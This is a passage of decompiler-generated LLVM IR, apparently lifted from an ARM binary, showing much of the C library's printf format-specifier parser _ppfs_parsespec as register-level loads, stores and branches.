  %tmp = icmp ugt i32 %v1_c7ac, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38042)
  br i1 %tmp, label %dec_label_pc_c7ac, label %dec_label_pc_c7c0.loopexit

dec_label_pc_c7c0.loopexit:                       ; preds = %dec_label_pc_c7b8
  br label %dec_label_pc_c7c0

dec_label_pc_c7c0:                                ; preds = %dec_label_pc_c7c0.loopexit, %dec_label_pc_c7ac.dec_label_pc_c7c0_crit_edge
  %v2_c7d0.pre-phi = sub i32 %v1_c7ac, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38042)
  store i32 %v2_c7d0.pre-phi, i32* @r2, align 4
  %v4_c7d4 = sdiv i32 %v2_c7d0.pre-phi, 2
  %v5_c7d4 = add i32 %v4_c7d4, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38018)
  %v6_c7d4 = inttoptr i32 %v5_c7d4 to i8*
  %v7_c7d4 = load i8, i8* %v6_c7d4, align 1
  %v9_c7d4 = zext i8 %v7_c7d4 to i32
  ret i32 %v9_c7d4

; uselistorder directives
  uselistorder i32 %v2_c7d0.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c7ac, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38042), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_c7e8 = load i32, i32* @r4, align 4
  store i32 %v3_c7e8, i32* %stack_var_-36, align 4
  %v6_c7e8 = load i32, i32* @r5, align 4
  %v27_c7e8 = load i32, i32* @lr, align 4
  %v0_c7ec = load i32, i32* %r0.global-to-local, align 4
  %v1_c7ec = add i32 %v0_c7ec, 16
  %v2_c7ec = inttoptr i32 %v1_c7ec to i32*
  %v3_c7ec = load i32, i32* %v2_c7ec, align 4
  %v1_c7f4 = and i32 %v3_c7ec, 128
  store i32 %v1_c7f4, i32* @r4, align 4
  %v2_c7f4 = icmp eq i32 %v1_c7f4, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_c7ec, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @lr, align 4
  %v1_c81c = add i32 %v0_c7ec, 24
  %v2_c81c = inttoptr i32 %v1_c81c to i32*
  %v3_c81c = load i32, i32* %v2_c81c, align 4
  store i32 %v3_c81c, i32* %fp.global-to-local, align 4
  br i1 %v2_c7f4, label %.dec_label_pc_c870_crit_edge, label %dec_label_pc_c828

.dec_label_pc_c870_crit_edge:                     ; preds = %entry
  %v2_c820 = inttoptr i32 %v0_c7ec to i32*
  %v3_c820 = load i32, i32* %v2_c820, align 4
  store i32 %v3_c820, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_c870

dec_label_pc_c828:                                ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c838 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_c82c

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c85c.dec_label_pc_c82c_crit_edge, %dec_label_pc_c828
  %v1_c83c = phi i32 [ %v1_c84c, %dec_label_pc_c85c.dec_label_pc_c82c_crit_edge ], [ 0, %dec_label_pc_c828 ]
  %v0_c82c = phi i32 [ %v0_c82c.pre, %dec_label_pc_c85c.dec_label_pc_c82c_crit_edge ], [ %v0_c7ec, %dec_label_pc_c828 ]
  %v1_c82c = inttoptr i32 %v0_c82c to i32*
  %v2_c82c = load i32, i32* %v1_c82c, align 4
  %v4_c830 = mul i32 %v1_c83c, 4
  %v5_c830 = add i32 %v2_c82c, %v4_c830
  store i32 %v5_c830, i32* %r3.global-to-local, align 4
  %v1_c834 = add i32 %v5_c830, -4
  %v2_c834 = inttoptr i32 %v1_c834 to i8*
  %v3_c834 = load i8, i8* %v2_c834, align 1
  %v4_c834 = zext i8 %v3_c834 to i32
  store i32 %v4_c834, i32* %r1.global-to-local, align 4
  store i32 %v2_c838, i32* @ip, align 4
  %v2_c83c = add i32 %v1_c83c, %v2_c838
  store i32 %v2_c83c, i32* %r2.global-to-local, align 4
  %v3_c840 = add i32 %v2_c83c, -72
  %v4_c840 = inttoptr i32 %v3_c840 to i8*
  store i8 %v3_c834, i8* %v4_c840, align 1
  %v0_c844 = load i32, i32* %r3.global-to-local, align 4
  %v1_c844 = add i32 %v0_c844, -4
  %v2_c844 = inttoptr i32 %v1_c844 to i32*
  %v3_c844 = load i32, i32* %v2_c844, align 4
  store i32 %v3_c844, i32* %r3.global-to-local, align 4
  %v0_c848 = load i32, i32* %r1.global-to-local, align 4
  %v9_c848 = icmp eq i32 %v0_c848, %v3_c844
  %v0_c84c = load i32, i32* %r0.global-to-local, align 4
  %v1_c84c = add i32 %v0_c84c, 1
  store i32 %v1_c84c, i32* %r0.global-to-local, align 4
  br i1 %v9_c848, label %dec_label_pc_c854, label %dec_label_pc_cd18

dec_label_pc_c854:                                ; preds = %dec_label_pc_c82c
  %v2_c854 = icmp eq i32 %v3_c844, 0
  br i1 %v2_c854, label %dec_label_pc_c864, label %dec_label_pc_c85c

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c854
  %tmp182 = icmp ult i32 %v1_c84c, 32
  br i1 %tmp182, label %dec_label_pc_c85c.dec_label_pc_c82c_crit_edge, label %dec_label_pc_c864

dec_label_pc_c85c.dec_label_pc_c82c_crit_edge:    ; preds = %dec_label_pc_c85c
  %v0_c82c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c82c

dec_label_pc_c864:                                ; preds = %dec_label_pc_c85c, %dec_label_pc_c854
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c86c = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_c86c, i32* %r0.global-to-local, align 4
  %v0_c87c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_c870

dec_label_pc_c870:                                ; preds = %.dec_label_pc_c870_crit_edge, %dec_label_pc_c864
  %v3_c8a4.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c870_crit_edge ], [ %v2_c838, %dec_label_pc_c864 ]
  %v0_c89c64 = phi i32 [ %v3_c820, %.dec_label_pc_c870_crit_edge ], [ %v2_c86c, %dec_label_pc_c864 ]
  %v0_c87c = phi i32 [ ptrtoint (i32* @global_var_23104.179 to i32), %.dec_label_pc_c870_crit_edge ], [ %v0_c87c.pre, %dec_label_pc_c864 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 800, i32* %r2.global-to-local, align 4
  %v2_c87c = add i32 %v0_c87c, -37980
  store i32 %v2_c87c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_c890 = inttoptr i32 %v2_c87c to i8*
  store i8* %v4_c890, i8** %stack_var_-120, align 4
  br label %dec_label_pc_c89c

dec_label_pc_c898:                                ; preds = %.thread20, %dec_label_pc_c9cc
  %v0_c898 = phi i32 [ %v2_ca44, %.thread20 ], [ %v0_c9a876, %dec_label_pc_c9cc ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_c9cc ]
  store i32 %v0_c898, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c89c

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c870, %dec_label_pc_c898
  %v1_c8b0 = phi i32 [ %v0_c89c64, %dec_label_pc_c870 ], [ %v0_c898, %dec_label_pc_c898 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_c870 ], [ %stack_var_-44.0, %dec_label_pc_c898 ]
  %v1_c89c = inttoptr i32 %v1_c8b0 to i8*
  %v2_c89c = load i8, i8* %v1_c89c, align 1
  %v3_c89c = zext i8 %v2_c89c to i32
  store i32 %v3_c89c, i32* %r3.global-to-local, align 4
  %v7_c8a0 = icmp eq i8 %v2_c89c, 42
  br i1 %v7_c8a0, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_c89c
  store i32 %v1_c8b0, i32* %r6.global-to-local, align 4
  %v0_c8b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c8b4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c8fc.preheader

bb:                                               ; preds = %dec_label_pc_c89c
  %v1_c8a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_c8a8 = load i32, i32* %sb.global-to-local, align 4
  %v4_c8a8 = mul i32 %v2_c8a8, %v1_c8a8
  %v5_c8a8 = add i32 %v4_c8a8, %v3_c8a4.pre-phi
  store i32 %v5_c8a8, i32* %r3.global-to-local, align 4
  %v2_c8b0 = add i32 %v1_c8b0, 1
  store i32 %v2_c8b0, i32* %r6.global-to-local, align 4
  %v0_c8b4111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c8b4111, i32* %r1.global-to-local, align 4
  %v3_c8b8 = add i32 %v5_c8a8, -40
  %v4_c8b8 = inttoptr i32 %v3_c8b8 to i32*
  store i32 %v0_c8b4111, i32* %v4_c8b8, align 4
  %v0_c900.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c8fc.preheader

dec_label_pc_c8fc.preheader:                      ; preds = %.thread8, %bb
  %v0_c900.pre = phi i32 [ %v1_c8b0, %.thread8 ], [ %v0_c900.pre.pre, %bb ]
  %v0_c904.pre = load i32, i32* @lr, align 4
  %v2_c904 = add i32 %v0_c904.pre, 800
  %v3_c904 = inttoptr i32 %v2_c904 to i32*
  br label %dec_label_pc_c8fc

dec_label_pc_c8c0:                                ; preds = %dec_label_pc_c8fc
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_c8c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_c8c4 = add i32 %v0_c8c4, -214748363
  %tmp139 = sub i32 214748362, %v0_c8c4
  %v6_c8c4 = and i32 %tmp139, %v0_c8c4
  %v7_c8c4 = icmp slt i32 %v6_c8c4, 0
  %v8_c8c4 = icmp slt i32 %v2_c8c4, 0
  %v9_c8c4 = icmp eq i32 %v0_c8c4, 214748363
  %v3_c8c8 = xor i1 %v8_c8c4, %v7_c8c4
  %v4_c8c8 = or i1 %v9_c8c4, %v3_c8c8
  br i1 %v4_c8c8, label %dec_label_pc_c8e0, label %dec_label_pc_c8cc

dec_label_pc_c8cc:                                ; preds = %dec_label_pc_c8c0
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_c8d0 = icmp eq i32 %v0_c8c4, 214748364
  br i1 %v9_c8d0, label %dec_label_pc_c8d8, label %dec_label_pc_c8f8

dec_label_pc_c8d8:                                ; preds = %dec_label_pc_c8cc
  %v8_c8dc = icmp ugt i8 %v2_c900, 55
  br i1 %v8_c8dc, label %dec_label_pc_c8f8, label %dec_label_pc_c8e0

dec_label_pc_c8e0:                                ; preds = %dec_label_pc_c8d8, %dec_label_pc_c8c0
  %v2_c8e4 = mul i32 %v0_c8c4, 10
  %v1_c8e8 = add i32 %v2_c8e4, -48
  store i32 %v1_c8e8, i32* %r3.global-to-local, align 4
  %v2_c8ec = add i32 %v1_c8e8, %v3_c900
  br label %dec_label_pc_c8f8

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8d8, %dec_label_pc_c8cc, %dec_label_pc_c8e0
  %storemerge = phi i32 [ %v2_c8ec, %dec_label_pc_c8e0 ], [ 2147483647, %dec_label_pc_c8cc ], [ 2147483647, %dec_label_pc_c8d8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_c8f8 = add i32 %v0_c980, 1
  store i32 %v1_c8f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8fc.preheader, %dec_label_pc_c8f8
  %v0_c980 = phi i32 [ %v0_c900.pre, %dec_label_pc_c8fc.preheader ], [ %v1_c8f8, %dec_label_pc_c8f8 ]
  store i32 800, i32* %r2.global-to-local, align 4
  %v1_c900 = inttoptr i32 %v0_c980 to i8*
  %v2_c900 = load i8, i8* %v1_c900, align 1
  %v3_c900 = zext i8 %v2_c900 to i32
  store i32 %v3_c900, i32* @ip, align 4
  %v4_c904 = load i32, i32* %v3_c904, align 4
  store i32 %v4_c904, i32* %r3.global-to-local, align 4
  %v2_c908 = mul nuw nsw i32 %v3_c900, 2
  store i32 %v2_c908, i32* %r2.global-to-local, align 4
  %v2_c90c = add i32 %v2_c908, %v4_c904
  %v3_c90c = inttoptr i32 %v2_c90c to i16*
  %v4_c90c = load i16, i16* %v3_c90c, align 2
  %v6_c90c = zext i16 %v4_c90c to i32
  store i32 %v6_c90c, i32* %r3.global-to-local, align 4
  %v1_c910 = and i32 %v6_c90c, 8
  %v2_c910 = icmp eq i32 %v1_c910, 0
  br i1 %v2_c910, label %dec_label_pc_c918, label %dec_label_pc_c8c0

dec_label_pc_c918:                                ; preds = %dec_label_pc_c8fc
  %v0_c918 = load i32, i32* %r0.global-to-local, align 4
  %v1_c918 = add i32 %v0_c918, -1
  %v2_c918 = inttoptr i32 %v1_c918 to i8*
  %v3_c918 = load i8, i8* %v2_c918, align 1
  %v4_c918 = zext i8 %v3_c918 to i32
  store i32 %v4_c918, i32* %r3.global-to-local, align 4
  %v7_c91c = icmp eq i8 %v3_c918, 37
  br i1 %v7_c91c, label %dec_label_pc_c924, label %dec_label_pc_c9e4

dec_label_pc_c924:                                ; preds = %dec_label_pc_c918
  %v7_c924 = icmp eq i8 %v2_c900, 36
  %. = zext i1 %v7_c924 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_c930 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_c930, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_c924
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_c924, %bb144
  %v0_c938 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_c924 ]
  %v2_c938 = icmp eq i32 %v0_c938, 0
  %v0_c96c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_c938, label %dec_label_pc_c96c, label %dec_label_pc_c940

dec_label_pc_c940:                                ; preds = %thread-pre-split
  %v2_c96c = icmp eq i32 %v0_c96c, 0
  %v1_c944 = add i32 %v0_c980, 1
  store i32 %v1_c944, i32* %r0.global-to-local, align 4
  br i1 %v2_c96c, label %dec_label_pc_cd18, label %dec_label_pc_c94c

dec_label_pc_c94c:                                ; preds = %dec_label_pc_c940
  %v2_c94c = sub i32 %v0_c930, %v0_c96c
  %v4_c94c = xor i32 %v0_c96c, %v0_c930
  %v5_c94c = xor i32 %v2_c94c, %v0_c930
  %v6_c94c = and i32 %v5_c94c, %v4_c94c
  %v7_c94c = icmp slt i32 %v6_c94c, 0
  %v8_c94c = icmp slt i32 %v2_c94c, 0
  %v9_c94c = icmp eq i32 %v0_c930, %v0_c96c
  %v3_c950 = xor i1 %v8_c94c, %v7_c94c
  %v4_c950 = or i1 %v9_c94c, %v3_c950
  br i1 %v4_c950, label %dec_label_pc_c960, label %bb145

bb145:                                            ; preds = %dec_label_pc_c94c
  store i32 %v0_c930, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_c960

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c980, %dec_label_pc_c988
  %v0_c95c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c95c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_c960

dec_label_pc_c960:                                ; preds = %bb145, %dec_label_pc_c94c, %dec_label_pc_c95c
  %v0_c960 = phi i32 [ %v0_c918, %dec_label_pc_c95c ], [ %v1_c944, %dec_label_pc_c94c ], [ %v1_c944, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_c95c ], [ %v0_c930, %dec_label_pc_c94c ], [ %v0_c930, %bb145 ]
  store i32 %v0_c960, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_c99c.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_c99c = ptrtoint i8* %v2_c99c.pre to i32
  br label %dec_label_pc_c99c

dec_label_pc_c96c:                                ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_c96c, 1
  br i1 %tmp146, label %dec_label_pc_c980, label %dec_label_pc_c974

dec_label_pc_c974:                                ; preds = %dec_label_pc_c96c
  %v7_c974 = icmp eq i8 %v2_c900, 109
  br i1 %v7_c974, label %dec_label_pc_c9e4, label %dec_label_pc_cd18

dec_label_pc_c980:                                ; preds = %dec_label_pc_c96c
  %tmp183 = icmp ugt i32 %v0_c980, %v0_c918
  br i1 %tmp183, label %dec_label_pc_c988, label %dec_label_pc_c95c

dec_label_pc_c988:                                ; preds = %dec_label_pc_c980
  %v1_c988 = inttoptr i32 %v0_c918 to i8*
  %v2_c988 = load i8, i8* %v1_c988, align 1
  %v3_c988 = zext i8 %v2_c988 to i32
  store i32 %v3_c988, i32* %r3.global-to-local, align 4
  %v7_c98c = icmp eq i8 %v2_c988, 48
  br i1 %v7_c98c, label %dec_label_pc_c95c, label %bb147

bb147:                                            ; preds = %dec_label_pc_c988
  %v1_c990 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_c990, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_c9e4

dec_label_pc_c99c.loopexit:                       ; preds = %dec_label_pc_c9a4
  %v1_c9b0 = load i32, i32* @r4, align 4
  %v3_c9b0 = or i32 %v1_c9b0, %v0_c9c4
  store i32 %v3_c9b0, i32* @r4, align 4
  %v2_c9b4 = add i32 %v0_c9a876, 1
  store i32 %v2_c9b4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c99c

dec_label_pc_c99c:                                ; preds = %dec_label_pc_c99c.loopexit, %dec_label_pc_c960
  %v0_c9a876 = phi i32 [ %v2_c9b4, %dec_label_pc_c99c.loopexit ], [ %v0_c960, %dec_label_pc_c960 ]
  store i32 %v3_c99c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_c9a8 = inttoptr i32 %v0_c9a876 to i8*
  br label %dec_label_pc_c9a4

dec_label_pc_c9a4:                                ; preds = %dec_label_pc_c9bc, %dec_label_pc_c99c
  %v0_c9c4 = phi i32 [ %v2_c9c4, %dec_label_pc_c9bc ], [ 1, %dec_label_pc_c99c ]
  %v0_c9a4 = phi i32 [ %v5_c9a4, %dec_label_pc_c9bc ], [ %v3_c99c, %dec_label_pc_c99c ]
  %v1_c9a4 = inttoptr i32 %v0_c9a4 to i8*
  %v2_c9a4 = load i8, i8* %v1_c9a4, align 1
  %v3_c9a4 = zext i8 %v2_c9a4 to i32
  store i32 %v3_c9a4, i32* %r2.global-to-local, align 4
  %v5_c9a4 = add i32 %v0_c9a4, 1
  store i32 %v5_c9a4, i32* %r0.global-to-local, align 4
  %v2_c9a8 = load i8, i8* %v1_c9a8, align 1
  %v3_c9a8 = zext i8 %v2_c9a8 to i32
  store i32 %v3_c9a8, i32* %r3.global-to-local, align 4
  %v9_c9ac = icmp eq i8 %v2_c9a8, %v2_c9a4
  br i1 %v9_c9ac, label %dec_label_pc_c99c.loopexit, label %dec_label_pc_c9bc

dec_label_pc_c9bc:                                ; preds = %dec_label_pc_c9a4
  %v1_c9bc = inttoptr i32 %v5_c9a4 to i8*
  %v2_c9bc = load i8, i8* %v1_c9bc, align 1
  %v3_c9bc = zext i8 %v2_c9bc to i32
  store i32 %v3_c9bc, i32* %r3.global-to-local, align 4
  %v2_c9c0 = icmp eq i8 %v2_c9bc, 0
  %v2_c9c4 = mul i32 %v0_c9c4, 2
  store i32 %v2_c9c4, i32* %r1.global-to-local, align 4
  br i1 %v2_c9c0, label %dec_label_pc_c9cc, label %dec_label_pc_c9a4

dec_label_pc_c9cc:                                ; preds = %dec_label_pc_c9bc
  %v1_c9cc = add i32 %v0_c9a876, -1
  %v2_c9cc = inttoptr i32 %v1_c9cc to i8*
  %v3_c9cc = load i8, i8* %v2_c9cc, align 1
  %v7_c9d0 = icmp eq i8 %v3_c9cc, 37
  %v0_c9d4 = load i32, i32* @r4, align 4
  %v1_c9d4 = and i32 %v0_c9d4, 10
  store i32 %v1_c9d4, i32* %r3.global-to-local, align 4
  %v4_c9d8 = udiv i32 %v1_c9d4, 2
  %v5_c9d8 = sub nuw nsw i32 -1, %v4_c9d8
  %v6_c9d8 = and i32 %v0_c9d4, %v5_c9d8
  store i32 %v6_c9d8, i32* @r4, align 4
  br i1 %v7_c9d0, label %dec_label_pc_c9e0, label %dec_label_pc_c898

dec_label_pc_c9e0:                                ; preds = %dec_label_pc_c9cc
  %v0_c9e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c9e0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c9e4

dec_label_pc_c9e4:                                ; preds = %bb147, %dec_label_pc_c918, %dec_label_pc_c974, %dec_label_pc_c9e0
  %v1_ca24 = phi i32 [ %v0_c9a876, %dec_label_pc_c9e0 ], [ %v0_c980, %bb147 ], [ %v0_c980, %dec_label_pc_c974 ], [ %v0_c980, %dec_label_pc_c918 ]
  %v0_ca20 = phi i32 [ %v5_c9a4, %dec_label_pc_c9e0 ], [ %v0_c918, %bb147 ], [ %v0_c918, %dec_label_pc_c974 ], [ %v0_c918, %dec_label_pc_c918 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_c9e0 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_c974 ], [ %stack_var_-44.1, %dec_label_pc_c918 ]
  %v1_c9e4 = inttoptr i32 %v0_ca20 to i8*
  %v2_c9e4 = load i8, i8* %v1_c9e4, align 1
  %v3_c9e4 = zext i8 %v2_c9e4 to i32
  store i32 %v3_c9e4, i32* %r3.global-to-local, align 4
  %v7_c9e8 = icmp eq i8 %v2_c9e4, 42
  br i1 %v7_c9e8, label %dec_label_pc_c9f0, label %dec_label_pc_ca30

dec_label_pc_c9f0:                                ; preds = %dec_label_pc_c9e4
  %v0_c9f0 = load i32, i32* %fp.global-to-local, align 4
  %v2_c9f0 = icmp eq i32 %v0_c9f0, 0
  br i1 %v2_c9f0, label %dec_label_pc_ca20, label %dec_label_pc_c9f8

dec_label_pc_c9f8:                                ; preds = %dec_label_pc_c9f0
  %v1_c9f8 = inttoptr i32 %v1_ca24 to i8*
  %v2_c9f8 = load i8, i8* %v1_c9f8, align 1
  %v3_c9f8 = zext i8 %v2_c9f8 to i32
  store i32 %v3_c9f8, i32* %r3.global-to-local, align 4
  %v7_c9fc = icmp eq i8 %v2_c9f8, 36
  br i1 %v7_c9fc, label %dec_label_pc_ca04, label %dec_label_pc_cd18

dec_label_pc_ca04:                                ; preds = %dec_label_pc_c9f8
  %v0_ca04 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_ca04, 1
  br i1 %tmp148, label %dec_label_pc_cd18, label %dec_label_pc_ca0c

dec_label_pc_ca0c:                                ; preds = %dec_label_pc_ca04
  %v0_ca10 = load i32, i32* %r8.global-to-local, align 4
  %v1_ca10 = load i32, i32* %sb.global-to-local, align 4
  %v3_ca10 = mul i32 %v1_ca10, %v0_ca10
  %v4_ca10 = add i32 %v3_ca10, %v3_c8a4.pre-phi
  store i32 %v4_ca10, i32* %r3.global-to-local, align 4
  %v1_ca14 = add i32 %v1_ca24, 1
  store i32 %v1_ca14, i32* %r6.global-to-local, align 4
  %v2_ca18 = add i32 %v4_ca10, -12
  %v3_ca18 = inttoptr i32 %v2_ca18 to i32*
  store i32 %v0_ca04, i32* %v3_ca18, align 4
  br label %dec_label_pc_ca2c

dec_label_pc_ca20:                                ; preds = %dec_label_pc_c9f0
  %v1_ca20 = add i32 %v0_ca20, 1
  store i32 %v1_ca20, i32* %r3.global-to-local, align 4
  %v9_ca24 = icmp eq i32 %v1_ca20, %v1_ca24
  br i1 %v9_ca24, label %dec_label_pc_ca2c, label %dec_label_pc_cd18

dec_label_pc_ca2c:                                ; preds = %dec_label_pc_ca20, %dec_label_pc_ca0c
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ca30

dec_label_pc_ca30:                                ; preds = %dec_label_pc_c9e4, %dec_label_pc_ca2c
  %v0_ca30 = load i32, i32* %r8.global-to-local, align 4
  %v2_ca30 = icmp eq i32 %v0_ca30, 0
  br i1 %v2_ca30, label %dec_label_pc_ca3c, label %dec_label_pc_ca5c.loopexit

dec_label_pc_ca3c:                                ; preds = %dec_label_pc_ca30
  %v0_ca3c = load i32, i32* %r6.global-to-local, align 4
  %v1_ca3c = inttoptr i32 %v0_ca3c to i8*
  %v2_ca3c = load i8, i8* %v1_ca3c, align 1
  %v3_ca3c = zext i8 %v2_ca3c to i32
  store i32 %v3_ca3c, i32* %r3.global-to-local, align 4
  %v7_ca40 = icmp eq i8 %v2_ca3c, 46
  br i1 %v7_ca40, label %.thread20, label %dec_label_pc_ca54

.thread20:                                        ; preds = %dec_label_pc_ca3c
  %v2_ca44 = add i32 %v0_ca3c, 1
  store i32 %v2_ca44, i32* %r6.global-to-local, align 4
  %v1_ca48 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_ca48, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_c898

dec_label_pc_ca54:                                ; preds = %dec_label_pc_ca3c
  %v0_ca54 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_ca54, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_ca5c

dec_label_pc_ca5c.loopexit:                       ; preds = %dec_label_pc_ca30
  %v1_ca34 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_ca34, i32* @r5, align 4
  %v0_ca68.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ca5c

dec_label_pc_ca5c:                                ; preds = %dec_label_pc_ca5c.loopexit, %dec_label_pc_ca54
  %v0_ca68.pre = phi i32 [ %v0_ca68.pre.pre, %dec_label_pc_ca5c.loopexit ], [ %v0_ca3c, %dec_label_pc_ca54 ]
  store i32 -38104, i32* %r3.global-to-local, align 4
  %v0_ca60 = load i32, i32* @lr, align 4
  %v2_ca60 = add i32 %v0_ca60, -38104
  store i32 %v2_ca60, i32* %r1.global-to-local, align 4
  %v1_ca68 = inttoptr i32 %v0_ca68.pre to i8*
  br label %dec_label_pc_ca64

dec_label_pc_ca64:                                ; preds = %dec_label_pc_ca78, %dec_label_pc_ca5c
  %v0_ca78 = phi i32 [ %v1_ca78, %dec_label_pc_ca78 ], [ %v2_ca60, %dec_label_pc_ca5c ]
  %v1_ca64 = inttoptr i32 %v0_ca78 to i8*
  %v2_ca64 = load i8, i8* %v1_ca64, align 1
  %v3_ca64 = zext i8 %v2_ca64 to i32
  store i32 %v3_ca64, i32* %r2.global-to-local, align 4
  %v2_ca68 = load i8, i8* %v1_ca68, align 1
  %v3_ca68 = zext i8 %v2_ca68 to i32
  store i32 %v3_ca68, i32* %r3.global-to-local, align 4
  %v9_ca6c = icmp eq i8 %v2_ca68, %v2_ca64
  br i1 %v9_ca6c, label %bb149, label %dec_label_pc_ca78

bb149:                                            ; preds = %dec_label_pc_ca64
  %v2_ca70 = add i32 %v0_ca68.pre, 1
  store i32 %v2_ca70, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ca84

dec_label_pc_ca78:                                ; preds = %dec_label_pc_ca64
  %v1_ca78 = add i32 %v0_ca78, 1
  %v2_ca78 = inttoptr i32 %v1_ca78 to i8*
  %v3_ca78 = load i8, i8* %v2_ca78, align 1
  %v4_ca78 = zext i8 %v3_ca78 to i32
  store i32 %v4_ca78, i32* %r3.global-to-local, align 4
  store i32 %v1_ca78, i32* %r1.global-to-local, align 4
  %v2_ca7c = icmp eq i8 %v3_ca78, 0
  br i1 %v2_ca7c, label %dec_label_pc_ca84, label %dec_label_pc_ca64

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca78, %bb149
  %v1_caa8 = phi i32 [ %v2_ca70, %bb149 ], [ %v0_ca68.pre, %dec_label_pc_ca78 ]
  %v1_caa4 = phi i32 [ %v0_ca78, %bb149 ], [ %v1_ca78, %dec_label_pc_ca78 ]
  %v2_ca8c = sub i32 %v1_caa4, %v2_ca60
  store i32 %v2_ca8c, i32* %r3.global-to-local, align 4
  %v8_ca94 = icmp sgt i32 %v2_ca8c, 1
  br i1 %v8_ca94, label %.thread24, label %dec_label_pc_ca98

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca84
  %v1_ca98 = inttoptr i32 %v1_caa8 to i8*
  %v2_ca98 = load i8, i8* %v1_ca98, align 1
  %v3_ca98 = zext i8 %v2_ca98 to i32
